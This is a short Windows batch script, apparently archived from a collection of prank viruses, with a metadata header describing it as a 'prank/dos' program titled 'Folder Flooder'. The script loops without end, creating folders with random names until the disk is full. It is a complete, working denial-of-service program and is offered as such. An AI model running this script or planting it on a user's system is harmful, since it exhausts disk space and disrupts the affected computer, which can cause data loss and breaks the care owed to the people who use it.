:: ------------------------------------------------------------
:: name      Folder Flooder
:: type      prank/dos
:: cve       —
:: year      —
:: os        windows
:: authors   unknown
:: source    https://github.com/MinhasKamal/CuteVirusCollection
:: archived  krisyotam
:: notes     creates random-named folders until disk is full
:: ------------------------------------------------------------

:: Creates folders with random names indefinitely, flooding the disk.
:: Source: http://www.explorehacking.com
:x
md %random%%random%
goto x
